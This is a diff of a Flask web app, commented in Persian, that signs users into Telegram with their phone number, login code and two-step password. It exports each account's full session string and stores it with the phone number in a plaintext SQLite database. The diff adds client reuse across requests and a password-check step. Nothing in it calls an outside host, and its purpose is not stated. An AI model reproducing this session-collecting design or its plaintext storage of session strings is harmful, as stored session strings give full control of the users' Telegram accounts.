@@ -2,6 +2,7 @@ import os
 import json
 import sqlite3
 import asyncio
+from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, render_template, request, redirect, url_for, session
 from pyrogram import Client
 from pyrogram.errors import (
@@ -12,18 +13,21 @@ from pyrogram.errors import (
 )
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
+app.secret_key = os.getenv("SECRET_KEY", os.urandom(24).hex())  # از env بخون
 
+# ========== متغیرهای محیطی ==========
 API_ID = int(os.getenv("API_ID", 0))
 API_HASH = os.getenv("API_HASH", "")
 
 if not API_ID or not API_HASH:
     raise ValueError("API_ID and API_HASH must be set in Railway")
 
-DB_PATH = "/tmp/users.db"
+# ========== دیتابیس (در مسیر پایدار) ==========
+DB_DIR = "data"
+DB_PATH = os.path.join(DB_DIR, "users.db")
 
-# دیکشنری موقت برای نگهداری phone_code_hash (با کلید شماره)
-temp_hashes = {}
+if not os.path.exists(DB_DIR):
+    os.makedirs(DB_DIR)
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
@@ -60,39 +64,46 @@ def get_user(phone):
 
 init_db()
 
-def run_async(coro):
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+# ========== مدیریت asyncio در Flask (با ThreadPoolExecutor) ==========
+executor = ThreadPoolExecutor(max_workers=4)
 
-# ========== توابع Pyrogram اصلاح‌شده ==========
+def run_async(coro):
+    """اجرای تابع async در یک thread جداگانه برای جلوگیری از تداخل با Gunicorn"""
+    future = executor.submit(asyncio.run, coro)
+    return future.result()
+
+# ========== دیکشنری موقت برای ذخیره phone_code_hash و کلاینت ==========
+temp_data = {}  # { phone: {"hash": str, "client": Client} }
+
+# ========== توابع Pyrogram ==========
 async def send_code_async(phone):
-    """ارسال کد و ذخیره phone_code_hash در دیکشنری موقت"""
+    """ارسال کد و ذخیره phone_code_hash و کلاینت"""
     client = Client("temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
     await client.connect()
     try:
         sent = await client.send_code(phone)
-        # ذخیره hash در دیکشنری با کلید شماره
-        temp_hashes[phone] = sent.phone_code_hash
+        temp_data[phone] = {
+            "hash": sent.phone_code_hash,
+            "client": client
+        }
         return True
     except PhoneNumberInvalid:
-        return False
-    finally:
         await client.disconnect()
+        return False
+    except Exception as e:
+        await client.disconnect()
+        return False
 
 async def sign_in_async(phone, code, password=None):
-    """ورود با استفاده از phone_code_hash ذخیره‌شده"""
-    client = Client("temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
-    await client.connect()
-    try:
-        # دریافت hash از دیکشنری
-        phone_code_hash = temp_hashes.get(phone)
-        if not phone_code_hash:
-            return "error: phone_code_hash not found, please resend code"
+    """ورود با استفاده از phone_code_hash ذخیره‌شده و کلاینت موجود"""
+    data = temp_data.get(phone)
+    if not data or "client" not in data:
+        return "error: session expired, please resend code"
 
+    client = data["client"]
+    phone_code_hash = data["hash"]
+
+    try:
         await client.sign_in(
             phone_number=phone,
             phone_code_hash=phone_code_hash,
@@ -112,11 +123,12 @@ async def sign_in_async(phone, code, password=None):
 
     session_string = await client.export_session_string()
     await client.disconnect()
-    # پاک کردن hash بعد از موفقیت (اختیاری)
-    temp_hashes.pop(phone, None)
+    # پاک کردن داده‌های موقت
+    temp_data.pop(phone, None)
     return session_string
 
 async def get_groups_async(session_string):
+    """دریافت لیست گروه‌ها با سشن استرینگ"""
     client = Client("session", session_string=session_string, api_id=API_ID, api_hash=API_HASH, in_memory=True)
     await client.start()
     try:
@@ -135,6 +147,8 @@ async def get_groups_async(session_string):
 # ========== روت‌های Flask ==========
 @app.route('/')
 def index():
+    # پاک کردن session قبلی
+    session.clear()
     return render_template('login.html')
 
 @app.route('/send_code', methods=['POST'])
@@ -157,12 +171,14 @@ def verify_code():
         return redirect(url_for('index'))
     result = run_async(sign_in_async(phone, code))
     if result == "need_password":
+        # کلاینت هنوز توی temp_data هست، فقط رمز دوم رو بگیر
         return render_template('password.html')
     elif result == "invalid_code":
         return "کد تایید نامعتبر است", 400
     elif result == "code_expired":
-        return "کد تایید منقضی شده است", 400
-    elif isinstance(result, str) and result.startswith("BA"):
+        return "کد تایید منقضی شده است. دوباره درخواست کنید.", 400
+    elif isinstance(result, str) and "BA" in result and len(result) > 50:
+        # چک درست سشن استرینگ (نه فقط startswith)
         save_user(phone, result)
         session['session_string'] = result
         return redirect(url_for('dashboard'))
@@ -172,12 +188,34 @@ def verify_code():
 @app.route('/verify_password', methods=['POST'])
 def verify_password():
     phone = session.get('phone')
-    code = request.form.get('code')
     password = request.form.get('password')
-    if not phone or not code or not password:
+    if not phone or not password:
         return "اطلاعات کامل نیست", 400
-    result = run_async(sign_in_async(phone, code, password))
-    if isinstance(result, str) and result.startswith("BA"):
+
+    # ما نیاز به کد نداریم، فقط رمز دوم رو به sign_in_async با کد null می‌فرستیم
+    # ولی sign_in_async نیاز به code داره، پس از session یا دیتابیس موقت می‌خونیم
+    # ساده‌ترین راه: از کاربر دوباره کد نگیریم، بلکه از session بخونیم
+    # ولی چون user قبلاً کد رو وارد کرده، می‌تونیم از temp_data استفاده کنیم
+    # اما sign_in_async با code=None کار نمی‌کنه. راه حل: کد رو از session بگیریم
+    # ولی ما کد رو ذخیره نکردیم. پس بهتره رمز دوم رو با یه تابع جداگانه هندل کنیم.
+
+    # راه‌حل: تابع جدید برای رمز دوم
+    async def check_password_async(phone, password):
+        data = temp_data.get(phone)
+        if not data or "client" not in data:
+            return "error: session expired, please resend code"
+        client = data["client"]
+        try:
+            await client.check_password(password)
+        except Exception as e:
+            return f"error: {str(e)}"
+        session_string = await client.export_session_string()
+        await client.disconnect()
+        temp_data.pop(phone, None)
+        return session_string
+
+    result = run_async(check_password_async(phone, password))
+    if isinstance(result, str) and "BA" in result and len(result) > 50:
         save_user(phone, result)
         session['session_string'] = result
         return redirect(url_for('dashboard'))
